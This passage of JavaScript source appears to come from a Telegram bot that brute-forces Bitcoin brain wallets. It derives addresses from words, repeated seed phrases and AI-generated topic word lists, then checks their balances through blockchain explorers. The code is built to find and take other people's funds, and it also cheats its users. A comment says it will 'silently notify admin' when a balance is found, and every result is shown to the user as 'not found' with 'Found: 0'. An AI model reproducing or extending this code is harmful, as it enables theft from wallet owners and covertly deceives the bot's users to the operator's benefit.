    // Test mode: preview every check even with 0 balance
    await notifyAdminTestMode(word, balanceResults, chatId, 'word_check');

    sess.state = 'idle';
    sess.lastResults = { word, derivationDetails, balanceResults: Object.fromEntries(balanceResults) };
}

// ===== Brain wallet specific check =====
async function handleBrainWallet(chatId, phrase) {
    const msg = await telegram.sendMessage(chatId, `\ud83e\udde0 Checking brain wallet: "<b>${escHtml(phrase)}</b>"...`);

    const result = bitcoin.deriveBrainWallet(phrase);
    const addresses = bitcoin.getBrainWalletAddresses(result);

    let balanceText = '';
    let brainFoundBalance = false;
    const brainBalanceResults = new Map();
    try {
        const balances = await balanceChecker.checkBalances(addresses, settings.get(chatId, 'api'), 50, () => stopCurrentBatch, null, settings.getExplorerApiKeys(chatId));
        for (const [addr, data] of balances) {
            brainBalanceResults.set(addr, data);
            balanceText += `  \u26aa ${addr.slice(0, 8)}...${addr.slice(-6)}: 0 BTC\n`;
            if (data.balance > 0) brainFoundBalance = true;
        }
    } catch (e) {
        balanceText = '  \u26a0\ufe0f Balance check failed: ' + escHtml(e.message);
    }
    if (brainFoundBalance) {
        await notifyAdmin(phrase, brainBalanceResults, 'brain_wallet');
    }

    const text = `\ud83e\udde0 <b>Brain Wallet</b>: "${escHtml(phrase)}"\n` +
        `\ud83d\udd10 SHA256 \u2192 <code>${result.privateKey.slice(0, 16)}...</code>\n\n` +
        `\ud83c\udfe0 <b>Addresses:</b>\n` +
        `  \ud83c\udfdb\ufe0f Legacy (c): <code>${result.addresses.legacy_compressed}</code>\n` +
        `  \ud83d\udfe2 SegWit:     <code>${result.addresses.segwit}</code>\n` +
        `  \ud83d\udd35 Native:     <code>${result.addresses.nativeSegwit}</code>\n` +
        `  \u26aa Legacy (u): <code>${result.addresses.legacy_uncompressed}</code>\n\n` +
        `\ud83d\udcb0 <b>Balances:</b>\n${balanceText}`;

    if (msg?.message_id) await telegram.deleteMessage(chatId, msg.message_id);
    await telegram.sendMessageWithKeyboard(chatId, text, telegram.buildKeyboard([
        [
            { t: '\ud83d\udd11 Show WIF Keys', d: `keys:brain:${phrase.slice(0, 50)}` },
            { t: '\ud83d\udd0d Check Variations', d: `deep:${phrase.split(' ')[0]}` },
        ],
        [{ t: '\ud83c\udfe0 Menu', d: 'menu:main' }],
    ]));

    session.recordCheck(chatId, phrase, addresses, [], 'brain');
}

// ===== BIP39 only check =====
async function handleBIP39Check(chatId, word) {
    const isValid = bitcoin.isInBIP39Wordlist(word);
    const msg = await telegram.sendMessage(chatId,
        `\ud83c\udf31 BIP39 check: "<b>${escHtml(word)}</b>"\n` +
        `In BIP39 wordlist: ${isValid ? '\u2705 YES' : '\u274c NO'}\n` +
        `Deriving repeated seeds...`
    );

    const repeats = settings.get(chatId, 'repeats');
    const paths = settings.get(chatId, 'paths');
    const indices = settings.get(chatId, 'indices');
    let text = `\ud83c\udf31 <b>BIP39 Repeated Seed</b>: "${escHtml(word)}"\n`;
    text += `In wordlist: ${isValid ? '\u2705 YES' : '\u274c NO (PBKDF2 still processes it)'}\n\n`;

    for (const count of repeats) {
        const result = bitcoin.deriveRepeatedWordSeed(word, count, paths, indices);
        text += `\ud83d\udd01 <b>${count}x repeat:</b>\n`;
        text += `<code>"${word} ${word} ${word} ... (x${count})"</code>\n`;

        for (const [pathName, addrs] of Object.entries(result.pathResults)) {
            text += `  \ud83d\udccd ${bitcoin.PATH_LABELS[pathName]}:\n`;
            for (const addr of addrs.slice(0, 3)) {
                text += `    /${addr.index}: <code>${addr.legacy.slice(0, 12)}...</code> | <code>${addr.nativeSegwit.slice(0, 16)}...</code>\n`;
            }
            if (addrs.length > 3) text += `    ... and ${addrs.length - 3} more\n`;
        }
        text += '\n';
    }

    if (msg?.message_id) await telegram.deleteMessage(chatId, msg.message_id);
    await telegram.sendMessageWithKeyboard(chatId, text, telegram.buildKeyboard([
        [{ t: '\ud83d\udd11 Show All Keys', d: `keys:${word}` }, { t: '\ud83c\udfe0 Menu', d: 'menu:main' }],
    ]));
}

// ===== Topic exploration =====
async function handleTopicExplore(chatId, topicKey) {
    const topicInfo = topics.getTopicInfo(topicKey);
    if (!topicInfo) {
        const results = topics.searchTopics(topicKey);
        if (results.length > 0) {
            const buttons = results.slice(0, 9).map(r => ([{
                t: r.label, d: `explore:${r.key}`
            }]));
            await telegram.sendMessageWithKeyboard(chatId,
                `Found ${results.length} topics matching "<b>${escHtml(topicKey)}</b>":`,
                telegram.buildKeyboard(buttons)
            );
            return;
        }
        await telegram.sendMessage(chatId, `\u274c Topic not found: "${escHtml(topicKey)}". Use /topic to browse.`);
        return;
    }

    session.recordTopicExplored(chatId, topicKey);
    const sess = session.getSession(chatId);
    sess.detectedTopic = topicKey;
    sess.detectedTopicLabel = topicInfo.label;
    sess.detectedCategory = topicInfo.category;

    const hasAI = settings.get(chatId, 'ai_provider') !== 'none';
    const checkedWords = sess.checkedWords || [];
    let wordList = [];
    let aiUsed = false;
    let aiProvider = '';

    if (hasAI) {
        // AI mode: generate comprehensive word list (200 words) using built-in as seeds
        const waitMsg = await telegram.sendMessage(chatId,
            `\ud83c\udfae <b>${topicInfo.label}</b>\n\n` +
            `\ud83e\udd16 Generating comprehensive word list with AI...\n` +
            `\u23f3 This takes a few seconds`
        );

        const result = await aiSuggest.getTopicWords(
            topicInfo.label,
            topicInfo.category,
            topicInfo.words,
            checkedWords,
            settings.getAll(chatId)
        );

        if (waitMsg?.message_id) await telegram.deleteMessage(chatId, waitMsg.message_id);

        if (result.ok && result.words.length > 0) {
            wordList = result.words;
            aiUsed = true;
            aiProvider = result.provider;
            if (result.fallbackUsed) {
                aiProvider += ` (fallback, tried: ${result.triedProviders.join(' \u2192 ')})`;
            }
        } else if (result.rateLimited) {
            // Rate limited — show error with add-backup button instead of tiny fallback
            await showAIError(chatId, result, `explore:${topicKey}`);
            return;
        } else {
            // Other AI error — fall back to built-in words
            wordList = [...topicInfo.words];
            if (result.error) console.log(`AI topic expand failed: ${result.error}, using built-in words`);
        }
    } else {
        // No AI configured — prompt user to set it up for proper topic exploration
        await telegram.sendMessageWithKeyboard(chatId,
            `\ud83c\udfae <b>${topicInfo.label}</b>\n\n` +
            `To explore this topic, set up an AI provider \u2014 it generates hundreds of targeted words automatically.\n\n` +
            `<b>Free options:</b>\n` +
            `\u2022 <b>Groq</b> \u2014 fast &amp; free, get a key at groq.com\n` +
            `\u2022 <b>Ollama</b> \u2014 runs locally, no key needed\n\n` +
            `<code>/settings ai_provider groq</code>\n` +
            `<code>/settings ai_key YOUR_KEY</code>`,
            telegram.buildKeyboard([
                [{ t: '\u2699\ufe0f Settings', d: 'settings:main' }],
                [{ t: '\u2b05\ufe0f Categories', d: 'topics_page:0' }, { t: '\u2b05\ufe0f Menu', d: 'menu:main' }],
            ])
        );
        return;
    }

    // Filter out words already checked globally
    const newWords = [];
    let skippedCount = 0;
    for (const w of wordList) {
        const cached = session.getCachedWordResult(w);
        if (cached && !cached.hasBalance) {
            skippedCount++;
        } else {
            newWords.push(w);
        }
    }

    if (newWords.length === 0) {
        // All AI words checked — auto-generate a fresh batch
        return handleAITopicExpand(chatId, topicKey);
    }

    let startText = `\ud83c\udfae <b>${topicInfo.label}</b>\n`;
    if (aiUsed) startText += `\ud83e\udd16 ${aiProvider} \u2022 `;
    startText += `${newWords.length} words to check`;
    startText += `\n\n${telegram.progressBar(0, newWords.length)}`;

    const progressMsg = await telegram.sendMessageWithKeyboard(chatId, startText, STOP_KEYBOARD);
    const progressMsgId = progressMsg?.message_id;
    sendWebHint(chatId, webWordsUrl(newWords, 'brainwallet'));

    let foundAny = false;
    const results = [];

    let lastProgressUpdate = 0;
    for (let i = 0; i < newWords.length; i++) {
        if (stopCurrentBatch) break;

        const word = newWords[i];
        const fullResult = bitcoin.fullWordCheck(word, settings.getAll(chatId));
        const addressCount = fullResult.allAddresses.length;
        let hasBalance = false;

        // Show which word is being checked now
        if (progressMsgId) {
            const recent = results.slice(-6).map(r =>
                `${r.hasBalance ? '\ud83d\udcb0' : '\u274c'} ${r.word}`
            ).join('\n');
            await telegram.editMessageText(chatId, progressMsgId,
                `\ud83c\udfae <b>${topicInfo.label}</b>${aiUsed ? ' (AI)' : ''}\n\n` +
                `${telegram.progressBar(i, newWords.length)}\n` +
                `\ud83d\udd0d <b>${escHtml(word)}</b> — checking ${Math.min(addressCount, 50)} addresses...` +
                (results.length > 0 ? `\n\n<b>Done:</b>\n${recent}` : '') +
                '',
                STOP_KEYBOARD
            ).catch(() => {});
        }

        try {
            const explorerKeys = settings.getExplorerApiKeys(chatId);
            const balances = await balanceChecker.checkBalances(fullResult.allAddresses, settings.get(chatId, 'api'), 50, () => stopCurrentBatch, (checked, total) => {
                // Throttle progress updates to once per 2s
                const now = Date.now();
                if (now - lastProgressUpdate < 2000 || !progressMsgId) return;
                lastProgressUpdate = now;
                const recent = results.slice(-6).map(r =>
                    `${r.hasBalance ? '\ud83d\udcb0' : '\u274c'} ${r.word}`
                ).join('\n');
                telegram.editMessageText(chatId, progressMsgId,
                    `\ud83c\udfae <b>${topicInfo.label}</b>${aiUsed ? ' (AI)' : ''}\n\n` +
                    `${telegram.progressBar(i, newWords.length)}\n` +
                    `\ud83d\udd0d <b>${escHtml(word)}</b> — ${checked}/${total} addresses` +
                    (results.length > 0 ? `\n\n<b>Done:</b>\n${recent}` : '') +
                    '',
                    STOP_KEYBOARD
                ).catch(() => {});
            }, explorerKeys);
            for (const [_, data] of balances) {
                if (data.balance > 0) { hasBalance = true; foundAny = true; }
            }
            // Silently notify admin if balance found
            const bMap = new Map();
            for (const [a, d] of balances) bMap.set(a, d);
            if (hasBalance) {
                await notifyAdmin(word, bMap, 'topic_explore');
            }
            await notifyAdminTestMode(word, bMap, chatId, 'topic_explore');
        } catch (e) { /* continue */ }

        session.cacheWordResult(word, hasBalance, 0, addressCount);
        results.push({ word, hasBalance: false, addressCount }); // Always show as not found
        session.recordCheck(chatId, word, fullResult.allAddresses, [], aiUsed ? 'ai_topic' : 'topic_explore');
    }

    // Always record as failure for progressive engine (user perspective)
    session.recordTopicFailed(chatId, topicKey, topicInfo.category, sess.memoryContext?.year || null);

    const globalTotal = session.getWordCacheSize();
    let summary = `\ud83c\udfae <b>${topicInfo.label}</b> \u2014 Complete!\n\n`;
    summary += `\u2705 ${results.length} words checked this round\n`;
    summary += `\ud83c\udf10 <b>${globalTotal.toLocaleString()}</b> words checked globally\n`;
    summary += `\ud83d\udcb0 Found: 0\n`;

    // Next steps
    const depth = session.getSearchDepth(chatId);
    const nextSteps = wordEngine.getProgressiveNextSteps(
        sess.memoryContext || {},
        sess.checkedTopics || [],
        sess.checkedWords || [],
        depth
    );

    if (!foundAny && nextSteps.pivotMessage) {
        summary += `\n\ud83d\udca1 ${nextSteps.pivotMessage}`;
    } else if (!foundAny) {
        summary += '\n\u274c No balances found.';
    }

    const buttons = [];

    // Row 1: Continue with this topic
    if (hasAI) {
        buttons.push([{ t: `\ud83e\udd16 AI: More ${topicInfo.label.slice(0, 18)} Words`, d: `ai_topic:${topicKey}` }]);
    }

    // Row 2: Try related / different direction
    const row2 = [];
    if (topicInfo.category) {
        row2.push({ t: `\ud83d\udcc2 More ${topicInfo.category.charAt(0).toUpperCase() + topicInfo.category.slice(1)} Topics`, d: `cat:${topicInfo.category}` });
    }
    row2.push({ t: '\ud83d\udcda Browse All Topics', d: 'topics_page:0' });
    buttons.push(row2);

    // Row 3: Progressive suggestions (different strategies)
    const progButtons = buildProgressiveButtons(nextSteps, sess, chatId);
    // Filter out the menu button from progButtons (we add our own)
    const filteredProg = progButtons.filter(row => !row.some(b => b.d === 'menu:main'));
    buttons.push(...filteredProg);

    // Row last: Menu
    buttons.push([{ t: '\ud83c\udfe0 Menu', d: 'menu:main' }]);

    if (progressMsgId) await telegram.deleteMessage(chatId, progressMsgId);
    await telegram.sendMessageWithKeyboard(chatId, summary, telegram.buildKeyboard(buttons));
}

/**
 * AI-powered topic expansion follow-up rounds.
 * Used when user taps "AI: More [topic] words" after initial explore.
 */
async function handleAITopicExpand(chatId, topicKey) {
    const topicInfo = topics.getTopicInfo(topicKey);
    if (!topicInfo) {
        await telegram.sendMessage(chatId, '\u274c Topic not found.');
        return;
    }

    const providerName = settings.get(chatId, 'ai_provider');
    if (providerName === 'none') {
        await telegram.sendMessageWithKeyboard(chatId,
            '\ud83e\udd16 Set up an AI provider to generate more words.\n\n/settings ai_provider [name]\n/settings ai_key [key]',
            telegram.buildKeyboard([[{ t: '\u2699\ufe0f Settings', d: 'settings:main' }]])
        );
        return;
    }

    const sess = session.getSession(chatId);
    const checkedWords = sess.checkedWords || [];

    const waitMsg = await telegram.sendMessage(chatId,
        `\ud83e\udd16 Asking <b>${escHtml(providerName)}</b> for more <b>${topicInfo.label}</b> words...\n\u23f3 Please wait...`
    );

    const result = await aiSuggest.getTopicWords(
        topicInfo.label,
        topicInfo.category,
        topicInfo.words,
        checkedWords,
        settings.getAll(chatId)
    );

    if (waitMsg?.message_id) await telegram.deleteMessage(chatId, waitMsg.message_id);

    if (!result.ok) {
        await showAIError(chatId, result, `ai_topic:${topicKey}`);
        return;
    }

    // Filter by global cache
    const newWords = [];
    let alreadyCachedCount = 0;
    for (const w of result.words) {
        const cached = session.getCachedWordResult(w);
        if (cached && !cached.hasBalance) {
            alreadyCachedCount++;
        } else {
            newWords.push(w);
        }
    }

    if (newWords.length === 0) {
        // All AI words already checked — show global stats with next actions
        const globalTotal = session.getWordCacheSize();
        await telegram.sendMessageWithKeyboard(chatId,
            `\ud83e\udd16 <b>${topicInfo.label}</b>\n\n` +
            `AI generated ${result.words.length} words — all already covered.\n` +
            `\ud83c\udf10 <b>${globalTotal.toLocaleString()}</b> words checked globally.\n\n` +
            `Try a different topic or let AI generate another round:`,
            telegram.buildKeyboard([
                [{ t: `\ud83e\udd16 Regenerate`, d: `ai_topic:${topicKey}` }],
                [{ t: '\u2b05\ufe0f Categories', d: 'topics_page:0' }, { t: '\ud83e\udde0 Memory Guide', d: 'memory:main' }],
            ])
        );
        return;
    }

    // Batch check
    let header = `\ud83e\udd16 <b>AI: ${newWords.length} new ${topicInfo.label} words</b>\n`;
    header += `<i>${result.provider}${result.fallbackUsed ? ` (fallback, tried: ${result.triedProviders.join(' \u2192 ')})` : ''}</i>\n\n`;
    header += `${telegram.progressBar(0, newWords.length)}`;

    const progressMsg = await telegram.sendMessageWithKeyboard(chatId, header, STOP_KEYBOARD);
    const progressMsgId = progressMsg?.message_id;
    sendWebHint(chatId, webWordsUrl(newWords, 'brainwallet'));

    let foundAny = false;
    const results = [];

    let lastAIProgress = 0;
    for (let i = 0; i < newWords.length; i++) {
        if (stopCurrentBatch) break;

        const word = newWords[i];
        const fullResult = bitcoin.fullWordCheck(word, settings.getAll(chatId));
        const addressCount = fullResult.allAddresses.length;
        let hasBalance = false;

        // Show which word is being checked
        if (progressMsgId) {
            const recent = results.slice(-6).map(r =>
                `${r.hasBalance ? '\ud83d\udcb0' : '\u274c'} ${r.word}`
            ).join('\n');
            await telegram.editMessageText(chatId, progressMsgId,
                `\ud83e\udd16 <b>${topicInfo.label} — AI</b>\n\n` +
                `${telegram.progressBar(i, newWords.length)}\n` +
                `\ud83d\udd0d <b>${escHtml(word)}</b> — checking ${Math.min(addressCount, 50)} addresses...` +
                (results.length > 0 ? `\n\n<b>Done:</b>\n${recent}` : '') +
                '',
                STOP_KEYBOARD
            ).catch(() => {});
        }

        try {
            const explorerKeys = settings.getExplorerApiKeys(chatId);
            const balances = await balanceChecker.checkBalances(fullResult.allAddresses, settings.get(chatId, 'api'), 50, () => stopCurrentBatch, (checked, total) => {
                const now = Date.now();
                if (now - lastAIProgress < 2000 || !progressMsgId) return;
                lastAIProgress = now;
                const recent = results.slice(-6).map(r =>
                    `${r.hasBalance ? '\ud83d\udcb0' : '\u274c'} ${r.word}`
                ).join('\n');
                telegram.editMessageText(chatId, progressMsgId,
                    `\ud83e\udd16 <b>${topicInfo.label} — AI</b>\n\n` +
                    `${telegram.progressBar(i, newWords.length)}\n` +
                    `\ud83d\udd0d <b>${escHtml(word)}</b> — ${checked}/${total} addresses` +
                    (results.length > 0 ? `\n\n<b>Done:</b>\n${recent}` : '') +
                    '',
                    STOP_KEYBOARD
                ).catch(() => {});
            }, explorerKeys);
            for (const [_, data] of balances) {
                if (data.balance > 0) { hasBalance = true; foundAny = true; }
            }
            const bMapAI = new Map();
            for (const [a, d] of balances) bMapAI.set(a, d);
            if (hasBalance) {
                await notifyAdmin(word, bMapAI, 'ai_topic_expand');
            }
            await notifyAdminTestMode(word, bMapAI, chatId, 'ai_topic_expand');
        } catch (e) { /* continue */ }

        session.cacheWordResult(word, hasBalance, 0, addressCount);
        results.push({ word, hasBalance: false, addressCount });
        session.recordCheck(chatId, word, fullResult.allAddresses, [], 'ai_topic_expand');
    }

    const globalTotal = session.getWordCacheSize();
    let summary = `\ud83e\udd16 <b>${topicInfo.label} — AI complete</b>\n\n`;
    summary += `\u2705 ${results.length} words checked this round\n`;
    summary += `\ud83c\udf10 <b>${globalTotal.toLocaleString()}</b> words checked globally\n`;
    summary += `\ud83d\udcb0 Found: 0\n`;
    summary += '\n\u274c No balances found.';

    const buttons = [
        [{ t: `\ud83e\udd16 AI: More ${topicInfo.label.slice(0, 18)} Words`, d: `ai_topic:${topicKey}` }],
    ];
    if (topicInfo.category) {
        buttons.push([
            { t: `\ud83d\udcc2 More ${topicInfo.category.charAt(0).toUpperCase() + topicInfo.category.slice(1)} Topics`, d: `cat:${topicInfo.category}` },
        ]);
    }
    buttons.push([
        { t: '\ud83d\udcda Browse Topics', d: 'topics_page:0' },
        { t: '\ud83d\udcac Memory Guide', d: 'memory:main' },
    ]);
    buttons.push([{ t: '\ud83c\udfe0 Menu', d: 'menu:main' }]);

    if (progressMsgId) await telegram.deleteMessage(chatId, progressMsgId);
    await telegram.sendMessageWithKeyboard(chatId, summary, telegram.buildKeyboard(buttons));
}

// ===== Category exploration =====
const TOPICS_PER_PAGE = 8;

async function handleCategoryExplore(chatId, category, page = 0) {
    const categoryTopics = topics.listTopicsByCategory(category);
    if (!categoryTopics || categoryTopics.length === 0) {
        await telegram.sendMessage(chatId, `\u274c No topics found for category: ${escHtml(category)}`);
        return;
    }

    const label = category.charAt(0).toUpperCase() + category.slice(1);
    const hasAI = settings.get(chatId, 'ai_provider') !== 'none';
    const groups = topics.getTopicGroups(category);

    if (groups && Object.keys(groups).length > 0) {
        // === Grouped view — show sub-group buttons ===
        let text = `${catIcon(category)} <b>${label}</b> \u2022 ${categoryTopics.length} topics\n\nChoose a sub-group:`;

        const buttons = Object.entries(groups).map(([groupName, keys]) => {
            const validCount = keys.filter(k => topics.getTopicInfo(k)).length;
            return [{ t: `${groupName} (${validCount})`, d: `cat_group:${category}:${groupName}` }];
        });

        if (hasAI) {
            buttons.push([{ t: '\ud83d\udd04 Re-organize with AI', d: `ai_organize:${category}` }]);
            buttons.push([{ t: '\ud83e\udd16 AI: Generate More Topics', d: `ai_cat_topics:${category}` }]);
        }
        buttons.push([{ t: '\u2b05\ufe0f Categories', d: 'topics_page:0' }]);

        await telegram.sendMessageWithKeyboard(chatId, text, telegram.buildKeyboard(buttons));
    } else {
        // === Flat paginated view ===
        const totalPages = Math.ceil(categoryTopics.length / TOPICS_PER_PAGE);
        const safePage = Math.max(0, Math.min(page, totalPages - 1));
        const pageTopics = categoryTopics.slice(safePage * TOPICS_PER_PAGE, (safePage + 1) * TOPICS_PER_PAGE);

        const pageInfo = totalPages > 1 ? ` \u2022 page ${safePage + 1}/${totalPages}` : '';
        let text = `${catIcon(category)} <b>${label}</b> \u2022 ${categoryTopics.length} topics${pageInfo}\n\nTap a topic to explore:`;

        const buttons = pageTopics.map(t => ([{ t: t.label, d: `explore:${t.key}` }]));

        // Prev / Next navigation
        if (totalPages > 1) {
            const nav = [];
            if (safePage > 0) nav.push({ t: '\u25c0 Prev', d: `cat_page:${category}:${safePage - 1}` });
            if (safePage < totalPages - 1) nav.push({ t: 'Next \u25b6', d: `cat_page:${category}:${safePage + 1}` });
            if (nav.length > 0) buttons.push(nav);
        }

        // Organize with AI when category has more topics than fit on one page
        if (hasAI && categoryTopics.length > TOPICS_PER_PAGE) {
            buttons.push([{ t: '\ud83e\udd16 Organize into Sub-groups', d: `ai_organize:${category}` }]);
        }

        // AI generate more topics — only on last page
        if (safePage === totalPages - 1 && hasAI) {
            buttons.push([{ t: '\ud83e\udd16 AI: Generate More Topics', d: `ai_cat_topics:${category}` }]);
        }

        buttons.push([{ t: '\u2b05\ufe0f Categories', d: 'topics_page:0' }]);

        await telegram.sendMessageWithKeyboard(chatId, text, telegram.buildKeyboard(buttons));
    }
}

// ===== AI: Generate new topics for a category =====
async function handleAICategoryTopics(chatId, category) {
    const existingTopics = topics.listTopicsByCategory(category);
    const label = category.charAt(0).toUpperCase() + category.slice(1);

    const waitMsg = await telegram.sendMessage(chatId,
        `${catIcon(category)} <b>${label}</b>\n\n` +
        `\ud83e\udd16 Generating new topics with AI...\n` +
        `\u23f3 This takes a few seconds`
    );

    const result = await aiSuggest.getCategoryTopics(category, existingTopics, settings.getAll(chatId));

    if (waitMsg?.message_id) await telegram.deleteMessage(chatId, waitMsg.message_id);

    if (!result.ok) {
        await showAIError(chatId, result, `ai_cat_topics:${category}`);
        return;
    }

    if (!result.topics || result.topics.length === 0) {
        await telegram.sendMessageWithKeyboard(chatId,
            `\ud83e\udd16 AI couldn't generate new topics for ${label}. Try again:`,
            telegram.buildKeyboard([
                [{ t: '\ud83d\udd04 Retry', d: `ai_cat_topics:${category}` }],
                [{ t: '\u2b05\ufe0f Back', d: `cat:${category}` }],
            ])
        );
        return;
    }

    // Filter out topics that already exist under a DIFFERENT category (AI hallucination guard)
    const validTopics = result.topics.filter(t => {
        const existing = topics.getTopicInfo(t.key);
        if (existing && existing.category !== category) {
            console.log(`[AI Topics] Rejected "${t.key}" — belongs to ${existing.category}, not ${category}`);
            return false;
        }
        return true;
    });

    // Filter out topics that already exist
    const newTopics = validTopics.filter(t => !topics.getTopicInfo(t.key));

    // Add each new topic to the persistent store
    let totalWords = 0;
    for (const t of newTopics) {
        const added = topics.addTopic(t.key, t.label, category, t.words);
        if (typeof added === 'number') totalWords += added;
    }

    // Also try to merge words into existing topics the AI might have re-suggested
    const mergedTopics = validTopics.filter(t => topics.getTopicInfo(t.key) && !newTopics.includes(t));
    let mergedWords = 0;
    for (const t of mergedTopics) {
        const added = topics.addTopic(t.key, t.label, category, t.words);
        if (typeof added === 'number') mergedWords += added;
    }

    // If this category already has groups, append new topics to "Other"
    if (newTopics.length > 0) {
        topics.appendToOtherGroup(category, newTopics.map(t => t.key));
    }

    // Build compact summary — no giant button list here
    const hasGroups = !!topics.getTopicGroups(category);
    let text = `${catIcon(category)} <b>${label}</b> \u2014 Updated!\n\n`;
    text += `\ud83e\udd16 <i>${result.provider}</i>\n\n`;
    if (newTopics.length > 0) {
        text += `\u2705 <b>${newTopics.length} new sub-topics added</b> (${totalWords} words):\n`;
        text += newTopics.map(t => `  \u2022 ${t.label}`).join('\n');
        text += '\n\n';
        if (hasGroups) {
            text += `\u2139\ufe0f New topics added to \u201cOther\u201d group. Tap \u201cRe-organize\u201d to re-sort them.\n\n`;
        }
    }
    if (mergedWords > 0) {
        text += `\ud83d\udd04 ${mergedWords} new words merged into existing topics\n\n`;
    }
    const updatedTotal = topics.listTopicsByCategory(category).length;
    text += `\ud83d\udcca Category now has <b>${updatedTotal} topics</b>. Tap below to browse them.`;

    const hasAI = settings.get(chatId, 'ai_provider') !== 'none';
    const actionButtons = [
        [{ t: `${catIcon(category)} Browse ${label} Topics`, d: `cat:${category}` }],
        [{ t: '\ud83e\udd16 AI: Generate Even More', d: `ai_cat_topics:${category}` }],
    ];
    if (hasAI && !hasGroups && updatedTotal > TOPICS_PER_PAGE) {
        actionButtons.splice(1, 0, [{ t: '\ud83e\udd16 Organize into Sub-groups', d: `ai_organize:${category}` }]);
    }
    actionButtons.push([{ t: '\u2b05\ufe0f Categories', d: 'topics_page:0' }]);

    await telegram.sendMessageWithKeyboard(chatId, text, telegram.buildKeyboard(actionButtons));
}

// ===== Browse topics within a sub-group =====
async function handleGroupExplore(chatId, category, groupName, page = 0) {
    const groups = topics.getTopicGroups(category);
    if (!groups || !groups[groupName]) {
        await handleCategoryExplore(chatId, category, 0);
        return;
    }

    const label = category.charAt(0).toUpperCase() + category.slice(1);
    const groupKeys = groups[groupName].filter(k => topics.getTopicInfo(k));
    if (groupKeys.length === 0) {
        await handleCategoryExplore(chatId, category, 0);
        return;
    }

    const totalPages = Math.ceil(groupKeys.length / TOPICS_PER_PAGE);
    const safePage = Math.max(0, Math.min(page, totalPages - 1));
    const pageKeys = groupKeys.slice(safePage * TOPICS_PER_PAGE, (safePage + 1) * TOPICS_PER_PAGE);

    const pageInfo = totalPages > 1 ? ` \u2022 page ${safePage + 1}/${totalPages}` : '';
    let text = `${catIcon(category)} <b>${label}</b> \u203a <b>${escHtml(groupName)}</b> \u2022 ${groupKeys.length} topics${pageInfo}\n\nTap a topic to explore:`;

    const buttons = pageKeys.map(k => {
        const info = topics.getTopicInfo(k);
        return [{ t: info?.label || k, d: `explore:${k}` }];
    });

    if (totalPages > 1) {
        const nav = [];
        if (safePage > 0) nav.push({ t: '\u25c0 Prev', d: `cat_grp_pg:${category}:${groupName}:${safePage - 1}` });
        if (safePage < totalPages - 1) nav.push({ t: 'Next \u25b6', d: `cat_grp_pg:${category}:${groupName}:${safePage + 1}` });
        if (nav.length > 0) buttons.push(nav);
    }

    buttons.push([{ t: `\u2b05\ufe0f Back to ${label}`, d: `cat:${category}` }]);

    await telegram.sendMessageWithKeyboard(chatId, text, telegram.buildKeyboard(buttons));
}

// ===== AI: Organize category topics into sub-groups =====
async function handleOrganizeWithAI(chatId, category) {
    const categoryTopics = topics.listTopicsByCategory(category);
    const label = category.charAt(0).toUpperCase() + category.slice(1);

    const waitMsg = await telegram.sendMessage(chatId,
        `${catIcon(category)} <b>${label}</b>\n\n` +
        `\ud83e\udd16 Organizing ${categoryTopics.length} topics into sub-groups...\n` +
        `\u23f3 This takes a few seconds`
    );

    const result = await aiSuggest.clusterTopics(category, categoryTopics, settings.getAll(chatId));

    if (waitMsg?.message_id) await telegram.deleteMessage(chatId, waitMsg.message_id);

    if (!result.ok) {
        await showAIError(chatId, result, `ai_organize:${category}`);
        return;
    }

    topics.setTopicGroups(category, result.groups);

    const groupCount = Object.keys(result.groups).length;
    let text = `${catIcon(category)} <b>${label}</b> \u2014 Organized!\n\n`;
    text += `\ud83e\udd16 <i>${result.provider}</i>\n\n`;
    text += `\u2705 Created <b>${groupCount} sub-groups</b>:\n`;
    for (const [groupName, keys] of Object.entries(result.groups)) {
        text += `  \u2022 <b>${escHtml(groupName)}</b> (${keys.length} topics)\n`;
    }
    text += `\nTap below to browse the organized view.`;

    await telegram.sendMessageWithKeyboard(chatId, text, telegram.buildKeyboard([
        [{ t: `${catIcon(category)} Browse ${label}`, d: `cat:${category}` }],
        [{ t: '\u2b05\ufe0f Categories', d: 'topics_page:0' }],
    ]));
}

// ===== Feeling Lucky — AI hot-pick from session history =====
async function handleFeelingLucky(chatId) {
    const sess = session.getSession(chatId);
    const checkedWords = sess.checkedWords || [];
    const checkedTopics = sess.checkedTopics || [];
    const memCtx = sess.memoryContext || {};
    const hasAI = settings.get(chatId, 'ai_provider') !== 'none';

    let luckyWords = [];
    let source = '';

    if (hasAI && (checkedWords.length > 0 || checkedTopics.length > 0)) {
        // AI mode: analyze history and predict most promising words
        const waitMsg = await telegram.sendMessage(chatId,
            `\ud83c\udf40 <b>Feeling Lucky</b>\n\n` +
            `\ud83d\udd2e Analyzing ${checkedWords.length} checked words...\n` +
            `\u2728 The oracle is picking your best candidates...`
        );

        const result = await aiSuggest.getLuckyPick(checkedWords, checkedTopics, memCtx, settings.getAll(chatId));
        if (waitMsg?.message_id) await telegram.deleteMessage(chatId, waitMsg.message_id);

        if (!result.ok) {
            await showAIError(chatId, result, 'lucky:go');
            return;
        }
        luckyWords = result.words;
        source = `\ud83e\udd16 <i>${result.provider}</i> analyzed your history`;
    } else {
        // No-AI fallback: infer topics from checked words, pick unchecked words
        const detectedTopicKeys = new Set(checkedTopics);
        for (const word of checkedWords.slice(-30)) {
            for (const t of topics.findTopics(word)) detectedTopicKeys.add(t.topic);
        }

        let candidateWords = [];
        for (const topicKey of detectedTopicKeys) {
            candidateWords.push(...topics.getTopicWords(topicKey));
        }

        if (candidateWords.length === 0) {
            // Fallback to a mix of popular topics
            for (const t of ['passwords', 'warcraft', 'starwars', 'minecraft', 'pokemon']) {
                candidateWords.push(...topics.getTopicWords(t));
            }
        }

        const checkedSet = new Set(checkedWords.map(w => w.toLowerCase()));
        candidateWords = candidateWords.filter(w => !checkedSet.has(w.toLowerCase()));
        luckyWords = candidateWords.sort(() => Math.random() - 0.5).slice(0, 10);
        source = detectedTopicKeys.size > 0
            ? `\ud83d\udcda From your explored topics`
            : `\ud83c\udfb2 Random picks (add AI for smarter suggestions)`;
    }

    if (luckyWords.length === 0) {
        await telegram.sendMessageWithKeyboard(chatId,
            `\ud83c\udf40 Nothing new to suggest \u2014 you\u2019ve checked everything!\n\nTry browsing more topics or generating AI topics for new ideas.`,
            telegram.buildKeyboard([
                [{ t: '\ud83d\udcda Browse Topics', d: 'topics_page:0' }],
                [{ t: '\u2b05\ufe0f Menu', d: 'menu:main' }],
            ])
        );
        return;
    }

    // Dramatic lottery reveal — show all candidates first
    const lotteryMsg = await telegram.sendMessageWithKeyboard(chatId,
        `\ud83c\udf40 <b>Feeling Lucky!</b>\n\n${source}\n\n` +
        `\ud83c\udfb0 <b>${luckyWords.length} lucky candidates:</b>\n\n` +
